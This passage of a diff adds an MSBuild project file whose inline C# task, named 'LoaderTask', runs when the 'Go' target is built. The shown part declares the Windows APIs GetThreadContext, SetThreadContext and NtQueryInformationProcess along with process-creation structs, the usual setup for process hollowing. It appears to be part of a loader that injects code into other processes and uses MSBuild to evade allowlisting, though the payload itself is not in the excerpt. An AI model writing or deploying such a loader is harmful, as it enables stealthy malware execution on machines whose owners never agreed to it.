+    public static extern bool GetThreadContext(System.IntPtr hThread, System.IntPtr lpContext);
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool SetThreadContext(System.IntPtr hThread, System.IntPtr lpContext);
+
+    [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+    public static extern int NtQueryInformationProcess(System.IntPtr hProcess, int processInformationClass,
+        out PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);
+}
+
+[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential,
+    CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
+struct STARTUPINFO
+{
+    public int cb;
+    public string lpReserved;
+    public string lpDesktop;
+    public string lpTitle;
+    public int dwX;
+    public int dwY;
+    public int dwXSize;
+    public int dwYSize;
+    public int dwXCountChars;
+    public int dwYCountChars;
+    public int dwFillAttribute;
+    public int dwFlags;
+    public short wShowWindow;
+    public short cbReserved2;
+    public System.IntPtr lpReserved2;
+    public System.IntPtr hStdInput;
+    public System.IntPtr hStdOutput;
+    public System.IntPtr hStdError;
+}
+
+[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+struct PROCESS_INFORMATION
+{
+    public System.IntPtr hProcess;
+    public System.IntPtr hThread;
+    public int dwProcessId;
+    public int dwThreadId;
+}
+
+[System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
+struct PROCESS_BASIC_INFORMATION
+{
+    public System.IntPtr ExitStatus;
+    public System.IntPtr PebBaseAddress;
+    public System.IntPtr AffinityMask;
+    public System.IntPtr BasePriority;
+    public System.IntPtr UniqueProcessId;
+    public System.IntPtr InheritedFromUniqueProcessId;
+}
+
+      ]]></Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="Go">
+    <LoaderTask />
+  </Target>
+
+</Project>
+
